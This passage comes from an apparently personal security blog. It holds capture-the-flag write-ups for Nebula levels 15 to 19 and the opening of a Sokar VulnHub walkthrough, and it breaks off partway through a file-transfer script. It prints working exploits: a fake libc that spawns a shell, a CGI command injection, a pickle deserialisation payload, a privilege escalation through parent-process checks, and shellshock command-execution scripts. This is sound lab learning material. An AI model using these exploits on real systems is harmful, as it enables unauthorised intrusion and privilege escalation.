<p>The search term <em>no version information available (required by</em> was the magic that finally got me towards an answer! I came across <a href="http://stackoverflow.com/questions/137773/what-does-the-no-version-information-available-error-from-linux-dynamic-linker">this</a> and <a href="http://superuser.com/questions/735736/no-version-information-available-required-by-usr-bin-ssh">this</a> post which talks about custom linking scripts. Basically, if I were to create a file with the contents <code>GLIBC_2.0 {};</code> in it and tell the linker at compile time (with <code>-Wl</code>) about it, then my problem will go away :)</p>

<p>```bash
level15@nebula:/var/tmp/flag15$ cat version.ld
GLIBC_2.0 {
};</p>

<p>level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC -Wl,&mdash;version-script=version.ld fake_libc.c -o libc.so.6
level15@nebula:/var/tmp/flag15$ ldd ~flag15/flag15</p>

<pre><code>linux-gate.so.1 =&gt;  (0x002b3000)
libc.so.6 =&gt; /var/tmp/flag15/libc.so.6 (0x00ca0000)
</code></pre>

<p>```</p>

<p>w00t. My <code>ldd</code> Error went away :)</p>

<p><code>bash
level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC -Wl,--version-script=version.ld fake_libc.c -o libc.so.6
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: version `GLIBC_2.1.3' not found (required by /var/tmp/flag15/libc.so.6)
</code></p>

<p>Another version related error. This time though it was for GLIBC version 2.1.3. I spiraled down another Google tunnel with this one and eventually came across static linking options for the linker. Basically, with <code>-Bstatic</code> and <code>-static-libgcc</code> we tell the compiler not to link against shared libraries. So, I added these too:</p>

<p><code>bash
level15@nebula:/var/tmp/flag15$ gcc -shared -static-libgcc -fPIC -Wl,--version-script=version.ld,-Bstatic fake_libc.c -o libc.so.6
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
Segmentation fault
</code></p>

<p>And now we are segfaulting. Great! <strong>Not!</strong> I poked around <code>gdb</code> a little and prodded around. Eventually I figured I should check if my <code>__libc_start_main</code> function is being called before the crash:</p>

<p>```bash
level15@nebula:/var/tmp/flag15$ cat fake_libc.c</p>

<h1>include&lt;stdio.h></h1>

<p>int __libc_start_main(int (<em>main) (int, char * </em>, char * <em>), int argc, char * * ubp_av, void (</em>init) (void), void (<em>fini) (void), void (</em>rtld_fini) (void), void (* stack_end)) {</p>

<pre><code>printf("hi mom!\n"); /* Added this line! */
return 0;
</code></pre>

<p>}
level15@nebula:/var/tmp/flag15$ gcc -shared -static-libgcc -fPIC -Wl,&mdash;version-script=version.ld,-Bstatic fake_libc.c -o libc.so.6
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
hi mom!
Segmentation fault
```</p>

<p>Yes! :D So even though I am causing <code>flag15</code> to crash, I have managed to introduce some code to it. I finally decided to add the <code>system()</code> call and recompile my fake libc.</p>

<p>So, to solve level15:</p>

<p>```bash
level15@nebula:/var/tmp/flag15$ cat fake_libc.c</p>

<h1>include&lt;stdio.h></h1>

<p>int __libc_start_main(int (<em>main) (int, char * </em>, char * <em>), int argc, char * * ubp_av, void (</em>init) (void), void (<em>fini) (void), void (</em>rtld_fini) (void), void (* stack_end)) {</p>

<pre><code>system("/bin/sh");
return 0;
</code></pre>

<p>}
level15@nebula:/var/tmp/flag15$ gcc -shared -static-libgcc -fPIC -Wl,&mdash;version-script=version.ld,-Bstatic fake_libc.c -o libc.so.6
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
sh-4.2$ getflag
You have successfully executed getflag on a target account
```</p>

<h2>level16</h2>

<p><a href="https://exploit-exercises.com/nebula/level16/">Level16&rsquo;s Description</a>:
<blockquote><p>There is a perl script running on port 1616.</p></blockquote></p>

<p>With the description we are provided with the source code of a small Perl program:</p>

<p>```perl index.pl</p>

<h1>!/usr/bin/env perl</h1>

<p>use CGI qw{param};</p>

<p>print &ldquo;Content-type: text/html\n\n&rdquo;;</p>

<p>sub login {
  $username = $<em>[0];
  $password = $</em>[1];</p>

<p>  $username =~ tr/a-z/A-Z/; # conver to uppercase
  $username =~ s/\s.*//;        # strip everything after a space</p>

<p>  @output = <code>egrep "^$username" /home/flag16/userdb.txt 2&gt;&amp;1</code>;
  foreach $line (@output) {</p>

<pre><code>  ($usr, $pw) = split(/:/, $line);


  if($pw =~ $password) {
      return 1;
  }
</code></pre>

<p>  }</p>

<p>  return 0;
}</p>

<p>sub htmlz {
  print(&ldquo;<html><head><title>Login resuls</title></head><body>&rdquo;);
  if($_[0] == 1) {</p>

<pre><code>  print("Your login was accepted&lt;br/&gt;");
</code></pre>

<p>  } else {</p>

<pre><code>  print("Your login failed&lt;br/&gt;");
</code></pre>

<p>  }
  print(&ldquo;Would you like a cookie?<br/><br/></body></html>\n&rdquo;);
}</p>

<p>htmlz(login(param(&ldquo;username&rdquo;), param(&ldquo;password&rdquo;)));
```</p>

<p>This script has a seemingly less obvious command injection vulnerability. The <code>egrep</code> command eventually gets the <code>$username</code> variable. This after it has gone through 2 sets of filters, one converting the username to uppercase and another truncating everything after a space. These filters are the core of the challenge.</p>

<p>Similarly to the other command injections, I replicated the filters so that I could print the output and see how I could manipulate them. The biggest problem being the fact that everything was converted to uppercase. Thankfully, that got sorted really quickly when I learnt of the <code>${A,,}</code> operator in bash. After quite a bit of trying different things, I finally got something that would work. I would first make the egrep happy by redirecting something to it to grep through. Once that was done, I declared a new variable <code>A</code> and set the command I wanted to run to it. Thereafter I converted it to lowercase and executed it wit <code>${A,,}</code> and commented the rest of the line out with a hash (#).</p>

<p>So, to solve level16:</p>

<p>```bash
level16@nebula:~$ vim /var/tmp/flag16.sh
level16@nebula:~$ chmod +x /var/tmp/flag16.sh
level16@nebula:~$ cat /var/tmp/flag16.sh</p>

<h1>!/bin/sh</h1>

<p>gcc /var/tmp/shell.c -o /var/tmp/flag16
chmod 4777 /var/tmp/flag16
```</p>

<p>On my host machine, I requested the web page hosting the perl script, triggering <code>/var/tmp/flag16</code> to run:</p>

<p>```bash
~ » curl -v &ldquo;<a href="http://192.168.217.239:1616/index.cgi?$">http://192.168.217.239:1616/index.cgi?$</a>(python -c &lsquo;import urllib; print urllib.urlencode({ "username&rdquo; : &ldquo;&rdquo;&ldquo;&rdquo;&lt;/etc/passwd;A=&ldquo;/var/tmp/flag16.sh&rdquo;;${A,,};#&ldquo;&rdquo;&ldquo;, "password&rdquo; : &ldquo;a&rdquo; })&rsquo;)&ldquo;
* Hostname was NOT found in DNS cache
*   Trying 192.168.217.239&hellip;
* Connected to 192.168.217.239 (192.168.217.239) port 1616 (#0)</p>

<blockquote><p>GET /index.cgi?username=%22%3C%2Fetc%2Fpasswd%3BA%3D%22%2Fvar%2Ftmp%2Fflag16.sh%22%3B%24%7BA%2C%2C%7D%3B%23&amp;password=a HTTP/1.1
User-Agent: curl/7.37.1
Host: 192.168.217.239:1616
Accept: <em>/</em></p>

<ul>
<li>HTTP 1.0, assume close after body
&lt; HTTP/1.0 200 OK
&lt; Content-type: text/html
&lt;
<html><head><title>Login resuls</title></head><body>Your login failed<br/>Would you like a cookie?<br/><br/></body></html></li>
<li>Closing connection 0
```</li>
</ul>
</blockquote>

<p>And then, just to read the flag:</p>

<p><code>bash
level16@nebula:~$ /var/tmp/flag16
sh-4.2$ getflag
You have successfully executed getflag on a target account
</code></p>

<h2>level17</h2>

<p><a href="https://exploit-exercises.com/nebula/level17/">Level17&rsquo;s Description</a>:
<blockquote><p>There is a python script listening on port 10007 that contains a vulnerability.</p></blockquote></p>

<p>With the description we are provided with the source code of a small Python program:</p>

<p>```perl level17.py</p>

<h1>!/usr/bin/python</h1>

<p>import os
import pickle
import time
import socket
import signal</p>

<p>signal.signal(signal.SIGCHLD, signal.SIG_IGN)</p>

<p>def server(skt):
  line = skt.recv(1024)</p>

<p>  obj = pickle.loads(line)</p>

<p>  for i in obj:</p>

<pre><code>  clnt.send("why did you send me " + i + "?\n")
</code></pre>

<p>skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
skt.bind((&lsquo;0.0.0.0&rsquo;, 10007))
skt.listen(10)</p>

<p>while True:
  clnt, addr = skt.accept()</p>

<p>  if(os.fork() == 0):</p>

<pre><code>  clnt.send("Accepted connection from %s:%d" % (addr[0], addr[1]))
  server(clnt)
  exit(1)
</code></pre>

<p>```</p>

<p>With this level, it was immediately obvious that user input was being used to unpickle. This is dangerous as user supplied code could be executed when the unpickle occurs. So, my plan was to write a simple class with a <code>__reduce__</code> method to pickle and send that over the socket that this code is listening on.</p>

<p>So, to solve level17:</p>

<p>```bash
level17@nebula:/var/tmp/flag17-prep$ cat sploit.py
from netcat import Netcat
import pickle
import os</p>

<p>command = &ldquo;&rdquo;&ldquo;gcc /var/tmp/shell.c -o /var/tmp/flag17; chmod 4777 /var/tmp/flag17&rdquo;&ldquo;&rdquo;</p>

<h1>setup the pickle</h1>

<p>class DoCmd(object):</p>

<pre><code>def __reduce__(self):
    return (os.system, ('{cmd}'.format(cmd = command),))
</code></pre>

<p>nc =  Netcat(&lsquo;127.0.0.1&rsquo;, 10007)
nc.read()
nc.write(pickle.dumps(DoCmd()))
nc.close()</p>

<p>level17@nebula:/var/tmp/flag17-prep$ python sploit.py
level17@nebula:/var/tmp/flag17-prep$ /var/tmp/flag17
sh-4.2$ getflag
You have successfully executed getflag on a target account
```</p>

<h2>level18</h2>

<p><a href="https://exploit-exercises.com/nebula/level18/">Level18&rsquo;s Description</a>:
<blockquote><p>Analyse the C program, and look for vulnerabilities in the program. There is an easy way to solve this level, an intermediate way to solve it, and a more difficult/unreliable way to solve it.</p></blockquote></p>

<p>With the description we are provided with the source code of a small C program:</p>

<p>```c level18.c</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;string.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;fcntl.h></h1>

<h1>include &lt;getopt.h></h1>

<p>struct {
  FILE *debugfile;
  int verbose;
  int loggedin;
} globals;</p>

<h1>define dprintf(&hellip;) if(globals.debugfile) \</h1>

<p>  fprintf(globals.debugfile, <strong>VA_ARGS</strong>)</p>

<h1>define dvprintf(num, &hellip;) if(globals.debugfile &amp;&amp; globals.verbose >= num) \</h1>

<p>  fprintf(globals.debugfile, <strong>VA_ARGS</strong>)</p>

<h1>define PWFILE &ldquo;/home/flag18/password&rdquo;</h1>

<p>void login(char <em>pw)
{
  FILE </em>fp;</p>

<p>  fp = fopen(PWFILE, &ldquo;r&rdquo;);
  if(fp) {</p>

<pre><code>  char file[64];

  if(fgets(file, sizeof(file) - 1, fp) == NULL) {
      dprintf("Unable to read password file %s\n", PWFILE);
      return;
  }
            fclose(fp);
  if(strcmp(pw, file) != 0) return;
</code></pre>

<p>  }
  dprintf(&ldquo;logged in successfully (with%s password file)\n&rdquo;,</p>

<pre><code>  fp == NULL ? "out" : "");
</code></pre>

<p>  globals.loggedin = 1;</p>

<p>}</p>

<p>void notsupported(char <em>what)
{
  char </em>buffer = NULL;
  asprintf(&amp;buffer, &ldquo;&mdash;> [%s] is unsupported at this current time.\n&rdquo;, what);
  dprintf(what);
  free(buffer);
}</p>

<p>void setuser(char *user)
{
  char msg[128];</p>

<p>  sprintf(msg, &ldquo;unable to set user to &lsquo;%s&rsquo; &mdash; not supported.\n&rdquo;, user);
  printf(&ldquo;%s\n&rdquo;, msg);</p>

<p>}</p>

<p>int main(int argc, char <strong>argv, char </strong>envp)
{
  char c;</p>

<p>  while((c = getopt(argc, argv, &ldquo;d:v&rdquo;)) != -1) {</p>

<pre><code>  switch(c) {
      case 'd':
          globals.debugfile = fopen(optarg, "w+");
          if(globals.debugfile == NULL) err(1, "Unable to open %s", optarg);
          setvbuf(globals.debugfile, NULL, _IONBF, 0);
          break;
      case 'v':
          globals.verbose++;
          break;
  }
</code></pre>

<p>  }</p>

<p>  dprintf(&ldquo;Starting up. Verbose level = %d\n&rdquo;, globals.verbose);</p>

<p>  setresgid(getegid(), getegid(), getegid());
  setresuid(geteuid(), geteuid(), geteuid());</p>

<p>  while(1) {</p>

<pre><code>  char line[256];
  char *p, *q;

  q = fgets(line, sizeof(line)-1, stdin);
  if(q == NULL) break;
  p = strchr(line, '\n'); if(p) *p = 0;
  p = strchr(line, '\r'); if(p) *p = 0;

  dvprintf(2, "got [%s] as input\n", line);

  if(strncmp(line, "login", 5) == 0) {
      dvprintf(3, "attempting to login\n");
      login(line + 6);
  } else if(strncmp(line, "logout", 6) == 0) {
      globals.loggedin = 0;
  } else if(strncmp(line, "shell", 5) == 0) {
      dvprintf(3, "attempting to start shell\n");
      if(globals.loggedin) {
          execve("/bin/sh", argv, envp);
          err(1, "unable to execve");
      }
      dprintf("Permission denied\n");
  } else if(strncmp(line, "logout", 4) == 0) {
      globals.loggedin = 0;
  } else if(strncmp(line, "closelog", 8) == 0) {
      if(globals.debugfile) fclose(globals.debugfile);
      globals.debugfile = NULL;
  } else if(strncmp(line, "site exec", 9) == 0) {
      notsupported(line + 10);
  } else if(strncmp(line, "setuser", 7) == 0) {
      setuser(line + 8);
  }
</code></pre>

<p>  }</p>

<p>  return 0;
}
```</p>

<p>Ok. Not so small then. This program took a while to work through. Initially the vulnerability was not so obvious. I could figure out that a few flags were setting a few things inside the global struct and that a password file exists. If I was able to read the password, then I could be marked as logged in and eventually get to the line that does <code>execve("/bin/sh", argv, envp);</code>.</p>

<p>I noticed the buffer overflow and format string vulnerabilities, but considering the binary was compiled with SSP, partial RELO, and a NX stack, I figured that memory corruption was not necessarily the way to complete this one.</p>

<p>Lots of toying around with the program eventually got me to realize the flaw. If for some reason the program was not able to read the password file successfully, it would just log us in. The password file is <code>/home/flag18/password</code> and we don’t have the required permissions to move it or something. I suppose that would have been too easy anyways ;p</p>

<p>So what do we have left? I had to poke around and think about conditions that could make opening a file fail. Eventually I remembered about maximum file descriptors and figured it was worth a shot. What motivated this thinking was the fact that the binary has a <code>closelog</code> command too. So, I started to play around with <code>ulimit</code>, gradually reducing <code>-n</code> until I got to the value 4 as the one that would let me log in due to the fact that the password file could no longer being able to be read; This thanks to the maximum open files limit being reached.</p>

<p>Without setting the max open files, a sample run would be:</p>

<p>```bash
level18@nebula:~$ touch /tmp/log
level18@nebula:~$ tail -f /tmp/log &amp;
[1] 6499</p>

<p>level18@nebula:~$ ~flag18/flag18 -vvv -d /tmp/log
Starting up. Verbose level = 3
login egg
got [login egg] as input
attempting to login
shell
got [shell] as input
attempting to start shell
Permission denied
```</p>

<p>Dropping the max open files to 4 though, we get:</p>

<p>```bash
level18@nebula:~$ ulimit -n 4</p>

<p>level18@nebula:~$ ~flag18/flag18 -vvv -d /tmp/log
-sh: start_pipeline: pgrp pipe: Too many open files
tail: /tmp/log: file truncated
Starting up. Verbose level = 3
login egg
got [login egg] as input
attempting to login
logged in successfully (without password file)
shell
got [shell] as input
attempting to start shell
/home/flag18/flag18: error while loading shared libraries: libncurses.so.5: cannot open shared object file: Error 24
```</p>

<p>Login worked :) We can also now call the shell command however the max open files thing looks like a problem. Luckily the binary had that <code>closelog</code> command that will free up a file descriptor. Rerunning the above but calling <code>closelog</code> before we call <code>shell</code> results in:</p>

<p>```bash
level18@nebula:~$ ~flag18/flag18 -vvv -d /tmp/log
-sh: start_pipeline: pgrp pipe: Too many open files
tail: /tmp/log: file truncated
Starting up. Verbose level = 3
login egg
got [login egg] as input
attempting to login
logged in successfully (without password file)
closelog
got [closelog] as input
shell
/home/flag18/flag18: -d: invalid option
Usage:  /home/flag18/flag18 [GNU long option] [option] &hellip;</p>

<pre><code>/home/flag18/flag18 [GNU long option] [option] script-file ...
</code></pre>

<p>GNU long options:</p>

<pre><code>--debug
--debugger
--dump-po-strings
--dump-strings
--help
--init-file
--login
--noediting
--noprofile
--norc
--posix
--protected
--rcfile
--restricted
--verbose
--version
</code></pre>

<p>Shell options:</p>

<pre><code>-irsD or -c command or -O shopt_option      (invocation only)
-abefhkmnptuvxBCHP or -o option
</code></pre>

<p>```</p>

<p>Examining the error we get now together with the source code, it was clear that the arguments sent to the <code>flag18</code> binary was also passed to the <code>execve()</code> call. That means that the error is actually sourced from the fact that <code>sh</code> has no <code>-d</code> flag. In fact, one could replicate this error by simply calling <code>sh -d</code>. This called for some more man page reading once again. I realized later that the error may have also been a sort of hint based on the fact that the <em>GNU long options</em> are shown. <code>--rcfile</code> seemed like a good option as it would allow me to specify a type of init script to run. I had a number of attempts to try get this into something workable. Eventually the only file I could get it to load was the logfile I was specifying when running <code>flag18</code>:</p>

<p><code>bash
level18@nebula:~$ ~flag18/flag18 --rcfile -d /tmp/log -vvv
-sh: start_pipeline: pgrp pipe: Too many open files
/home/flag18/flag18: invalid option -- '-'
/home/flag18/flag18: invalid option -- 'r'
/home/flag18/flag18: invalid option -- 'c'
/home/flag18/flag18: invalid option -- 'f'
/home/flag18/flag18: invalid option -- 'i'
/home/flag18/flag18: invalid option -- 'l'
/home/flag18/flag18: invalid option -- 'e'
tail: /tmp/log: file truncated
Starting up. Verbose level = 3
login egg
got [login egg] as input
attempting to login
logged in successfully (without password file)
closelog
got [closelog] as input
shell
/tmp/log: line 1: Starting: command not found
/tmp/log: line 2: got: command not found
/tmp/log: line 3: attempting: command not found
/tmp/log: line 4: syntax error near unexpected token `('
/tmp/log: line 4: `logged in successfully (without password file)'
</code></p>

<p>The line <code>Starting: command not found</code> was as close as I could get to some form of controlled command execution. So, I created this file, exported it into my <code>PATH</code> and used it to prepare a small SETUID C shell.</p>

<p>So, to solve level18:</p>

<p>```bash
level18@nebula:~$ vim /var/tmp/Starting
level18@nebula:~$ chmod +x /var/tmp/Starting
level18@nebula:~$ cat /var/tmp/Starting</p>

<h1>!/bin/sh</h1>

<p>/bin/sh</p>

<p>level18@nebula:~$ tail -f /tmp/log &amp;
[1] 7627</p>

<p>level18@nebula:~$ Starting up. Verbose level = 3
got [login egg] as input
attempting to login
logged in successfully (without password file)
got [closelog] as input</p>

<p>level18@nebula:~$ export PATH=/var/tmp:$PATH
level18@nebula:~$ ulimit -n 4</p>

<p>level18@nebula:~$ ~flag18/flag18 &mdash;rcfile -d /tmp/log -vvv
-sh: start_pipeline: pgrp pipe: Too many open files
/home/flag18/flag18: invalid option &mdash; &lsquo;&ndash;&rsquo;
/home/flag18/flag18: invalid option &mdash; &lsquo;r&rsquo;
/home/flag18/flag18: invalid option &mdash; &lsquo;c&rsquo;
/home/flag18/flag18: invalid option &mdash; &lsquo;f&rsquo;
/home/flag18/flag18: invalid option &mdash; &lsquo;i&rsquo;
/home/flag18/flag18: invalid option &mdash; &lsquo;l&rsquo;
/home/flag18/flag18: invalid option &mdash; &lsquo;e&rsquo;
tail: /tmp/log: file truncated
Starting up. Verbose level = 3
login egg
got [login egg] as input
attempting to login
logged in successfully (without password file)
closelog
got [closelog] as input
shell</p>

<p>sh-4.2$ getflag
sh: start_pipeline: pgrp pipe: Too many open files
You have successfully executed getflag on a target account
```</p>

<h2>level19</h2>

<p><a href="https://exploit-exercises.com/nebula/level19/">Level19&rsquo;s Description</a>:
<blockquote><p>There is a flaw in the below program in how it operates.</p></blockquote></p>

<p>With the description we are provided with the source code of a small C program:</p>

<p>```c level19.c</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;string.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;fcntl.h></h1>

<h1>include &lt;sys/stat.h></h1>

<p>int main(int argc, char <strong>argv, char </strong>envp)
{
  pid_t pid;
  char buf[256];
  struct stat statbuf;</p>

<p>  /<em> Get the parent&rsquo;s /proc entry, so we can verify its user id </em>/</p>

<p>  snprintf(buf, sizeof(buf)-1, &ldquo;/proc/%d&rdquo;, getppid());</p>

<p>  /<em> stat() it </em>/</p>

<p>  if(stat(buf, &amp;statbuf) == -1) {</p>

<pre><code>  printf("Unable to check parent process\n");
  exit(EXIT_FAILURE);
</code></pre>

<p>  }</p>

<p>  /<em> check the owner id </em>/</p>

<p>  if(statbuf.st_uid == 0) {</p>

<pre><code>  /* If root started us, it is ok to start the shell */

  execve("/bin/sh", argv, envp);
  err(1, "Unable to execve");
</code></pre>

<p>  }</p>

<p>  printf(&ldquo;You are unauthorized to run this program\n&rdquo;);
}
```</p>

<p>This one had me completely lost. After studying the functions used, I resorted to getting a hint. Partially reading another walkthrough, I came to the section where it mentions a <code>fork()</code> operation on the <code>flag19</code> binary. Basically, what it boils down to is the fact that when the process is forked and the parent dies, PID 1 (owned by root) will become the owner causing the checks we have in this binary to fail.</p>

<p>To go about this, we would have to write a small C wrapper that will fork itself. We need to give this wrapper a few seconds after the fork to finish off allowing the forked process to become orphaned. Once the process is in the orphaned state, we can <code>execv()</code> the <code>flag19</code> binary and prepare a shell :)</p>

<p>So, to solve level19:</p>

<p>```bash
level19@nebula:/var/tmp$ vim pwn19.c
level19@nebula:/var/tmp$ cat pwn19.c</p>

<h1>include&lt;stdio.h></h1>

<h1>include&lt;unistd.h></h1>

<p>int main(void) {</p>

<pre><code>pid_t pid = fork();

if (pid == 0) {

    char *arg[] = { "/bin/sh" , "-c" , "gcc /var/tmp/shell.c -o /var/tmp/flag19; chmod 4777 /var/tmp/flag19" , NULL};
    sleep(2); /* Give the fork 2 sec to orphan */
    execv("/home/flag19/flag19", arg);
    printf("Done fork\n");
    return 0;
}

printf("Done parent\n");
return 0;
</code></pre>

<p>}</p>

<p>level19@nebula:/var/tmp$ gcc pwn19.c -o pwn19
level19@nebula:/var/tmp$ ./pwn19
Done parent</p>

<p>level19@nebula:/var/tmp$ /var/tmp/flag19
sh-4.2$ getflag
You have successfully executed getflag on a target account
```</p>

<h2>conclusion</h2>

<p>Even though many of the levels were really really easy, the latter levels did force me to learn a few new things which was great. I think this is some really good learning material for people new to the scene. Heck, I think I will refer people to this next time they ask about OSCP&hellip; ;)</p>

<p>As a final touch, my &lsquo;loot&rsquo; in <code>/var/tmp</code> after finishing the last level:</p>

<p><img class="<a" src="href="https://i.imgur.com/JHZHRJD.png">https://i.imgur.com/JHZHRJD.png</a>"></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[beating sokar - the vulnhub turns 0b10 challenge]]></title>
    <link href="http://leonjza.github.io/blog/2015/02/21/beating-sokar-the-vulnhub-turns-0b10-challenge/"/>
    <updated>2015-02-21T15:55:03+02:00</updated>
    <id>http://leonjza.github.io/blog/2015/02/21/beating-sokar-the-vulnhub-turns-0b10-challenge</id>
    <content type="html"><![CDATA[<h2>introduction</h2>

<p><a href="http://blog.vulnhub.com/2015/01/vulnhub-is-0b10.html">Vulnhub is 0b10</a> years old. That is binary for 2 :) In order to celebrate this, <a href="https://twitter.com/_RastaMouse">@_RastaMouse</a>
 created <a href="https://www.vulnhub.com/entry/sokar-1,113/">Sokar</a>.</p>

<p> <img class="right <a" src="href="https://i.imgur.com/brPBCGq.png">https://i.imgur.com/brPBCGq.png</a>"></p>

<p>Sokar was used as another writeup competition (the first for 2015), similar to the <a href="https://leonjza.github.io/blog/2014/09/18/from-persistence/">Persistence</a> challenge from Sep &lsquo;14.
From the <a href="http://blog.vulnhub.com/2015/01/competition-sokar.html">competition announcement blogpost</a>, the rules of engagement were pretty familiar. Boot the VM, pwn it via the network and find the flag.
Of course, modifying the VM in order to help you get the flag (things like single user mode, rescue disks etc) are not allowed and you have to actually be able to prove how you got r00t.</p>

<p>Sokar frustrated me. A lot. However, almost all of the challenges and configurations of Sokar were plausible. Most of the vulnerabilities are valid in the sense that it may as well be out there in wild. So, it was a great learning experience once again!</p>

<p>Here is my entry for the competition. Enjoy! :)</p>

<!-- more -->


<h2>a usual start</h2>

<p>You know the drill. Download the VM, import it into your virtualization software, configure the network and start to fire <code>nmap</code> at it. I followed exactly these steps apart from using the usual <code>netdiscover</code> to determine the assigned IP address. Instead, I recently learnt about the built in VMWare Network Sniffer. So I figured it was time to give that a spin.</p>

<p>I knew which interface the network was bound to on my Mac, so I started the sniffer with <code>sudo /Applications/VMware\ Fusion.app/Contents/Library/vmnet-sniffer vmnet1</code>:</p>

<p>```bash
leonjza@laptop » sudo /Applications/VMware\ Fusion.app/Contents/Library/vmnet-sniffer vmnet1</p>

<p>[&hellip; snip IPv6 talky talky &hellip;]</p>

<p>IP src 0.0.0.0         dst 255.255.255.255 UDP src port 68 dst port 67
IP src 192.168.217.254 dst 192.168.217.163 UDP src port 67 dst port 68
```</p>

<p><strong>192.168.217.163</strong>. Great. This will be our target for a <code>nmap</code> scan. Sokar did not respond to pings, but that is no biggie. I see this many times in real world networks too, so heh. Don&rsquo;t rely on ICMP traffic ;)</p>

<p>```bash
leonjza@kali/sokar $ nmap &mdash;reason 192.168.217.163 -p-</p>

<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2015-02-02 21:09 SAST
Nmap scan report for 192.168.217.163
Host is up, received arp-response (0.00027s latency).
Not shown: 65534 filtered ports
Reason: 65534 no-responses
PORT    STATE SERVICE  REASON
591/tcp open  http-alt syn-ack
MAC Address: 08:00:27:F2:40:DB (Cadmus Computer Systems)</p>

<p>Nmap done: 1 IP address (1 host up) scanned in 1133.72 seconds
```</p>

<p>One port open on tcp. <code>tcp/591</code>.</p>

<h2>/cgi-bin/cat</h2>

<p>The service on <code>tcp/591</code> appeared to be a web server. The web server content updated every time it was requested. Inspection of the web page sources revealed the information is actually sourced from a HTML <code>&lt;iframe&gt;</code> to <a href="http://192.168.217.163:591/cgi-bin/cat.">http://192.168.217.163:591/cgi-bin/cat.</a> Requesting this page alone was the same stats, minus that creepy pink color ;)</p>

<p><img class="<a" src="href="https://i.imgur.com/nAoNCnK.png">https://i.imgur.com/nAoNCnK.png</a>"></p>

<p>I toyed around quite a bit with this webserver. The textbook approach of running <code>wfuzz</code> to discover some web paths, <code>nikto</code> to discover some interesting information etc. was used. Alas, none of these tools proved really useful.</p>

<p>Applying some more brain thingies to my current situation, I remembered the <a href="http://en.wikipedia.org/wiki/Shellshock_%28software_bug%29">Shellshock</a> bug disclosed in September 2014. The <code>/cgi-bin</code> path was the biggest hint towards it. I also remembered <a href="https://twitter.com/mubix">@mubix</a> was keeping a Github repository of <a href="https://github.com/mubix/shellshocker-pocs">PoC&rsquo;s for shellshock</a>, and promptly started to try a few against the CGI path.</p>

<p>Eventually, <a href="https://gist.github.com/mfadzilr/70892f43597e7863a8dc">this</a> PoC was modified a little to get me some working command injection via shellshock:</p>

<p>```bash
leonjza@kali/sokar $ curl -i -X OPTIONS -H &ldquo;User-Agent: () { :;};echo;/usr/bin/id&rdquo; &ldquo;<a href="http://192.168.217.163:591/cgi-bin/cat">http://192.168.217.163:591/cgi-bin/cat</a>&rdquo;
HTTP/1.1 200 OK
Date: Mon, 02 Feb 2015 21:23:07 GMT
Server: Apache/2.2.15 (CentOS)
Connection: close
Transfer-Encoding: chunked
Content-Type: text/plain; charset=UTF-8</p>

<p>uid=48(apache) gid=48(apache) groups=48(apache)
```</p>

<p>Yay. I was now able to execute commands as <code>apache</code>. This allowed me to enumerate a great deal of the machine with relative ease.</p>

<h2>making life easier</h2>

<p>Of course, constructing the curl request and header for every command that I wanted to run was starting to become boring really quickly. So, I slapped together some python that will accept an argument and execute the command (called <code>shock.py</code>):</p>

<p>```python</p>

<h1>!/usr/bin/python</h1>

<h1>Sokar Shellshock Command Execution</h1>

<h1>2015 Leon Jacobs</h1>

<p>import requests
import sys</p>

<p>if len(sys.argv) &lt; 2:</p>

<pre><code>print " * Usage %s &lt;cmd&gt;" % sys.argv[0]
sys.exit(1)
</code></pre>

<h1>vuln@ curl -i -X OPTIONS -H &ldquo;User-Agent: () { :;};echo;/bin/cat /etc/passwd&rdquo; &ldquo;<a href="http://192.168.217.163:591/cgi-bin/cat">http://192.168.217.163:591/cgi-bin/cat</a>&rdquo;</h1>

<p>command = sys.argv[1].strip()
print &ldquo; * Executing %s\n&rdquo; % command</p>

<h1>prepare the sploit header</h1>

<p>headers = { &ldquo;User-Agent&rdquo;: &ldquo;() { :;};echo;%s&rdquo; % command }
print requests.get(&ldquo;<a href="http://192.168.217.163:591/cgi-bin/cat">http://192.168.217.163:591/cgi-bin/cat</a>&rdquo;, headers=headers).text.strip()
```</p>

<p>Using the above script, I could now just do <code>python shock.py "/usr/bin/id"</code>:</p>

<p>```bash
leonjza@kali/sokar $ python shock.py &ldquo;/usr/bin/id&rdquo;
 * Executing /usr/bin/id</p>

<p>uid=48(apache) gid=48(apache) groups=48(apache)
```</p>

<p>During the initial enumeration phase, I tried to build myself a reverse shell. I confirmed that <code>netcat</code> was available and that <code>apache</code> was allowed to execute it, however, all of my attempts failed. <code>SELinux</code> was disabled so that was not the problem. Eventually I started wondering about egress fire-walling and decided that it was time for a outbound port scan!</p>

<p>I was able to write to <code>/tmp</code>, but for some reason I was having a really hard time getting newlines and quotes escaped so that I could essentially <code>echo &lt;script source&gt; &gt;&gt; /tmp/port_scan.py</code>. Eventually I resorted to writing a helper called <code>transfer.py</code> that was used to copy files over from my local Kali Linux install to the Sokar VM. In the long run, this made it really easy to copy scripts and tools over to Sokar:</p>

<p>```python</p>

<h1>!/usr/bin/python</h1>

<h1>Sokar Shellshock File Transfer</h1>

<h1>2015 Leon Jacobs</h1>

<p>import requests
import sys
import os
import binascii</p>

<p>def do_command(command):</p>

<pre><code>headers = { "User-Agent": "() { :;};echo;%s" % command }
r = requests.options("http://192.168.217.163:591/cgi-bin/cat", headers=headers)

if not r.status_code == 200:
    raise Exception(" ! Command %s failed")
</code></pre>

<p>if <strong>name</strong> == &ldquo;<strong>main</strong>&rdquo;:</p>

<pre><code>if len(sys.argv) &lt; 3:

    print " * Usage %s &lt;source&gt; &lt;destination&gt;" % sys.argv[0]
    sys.exit(1)

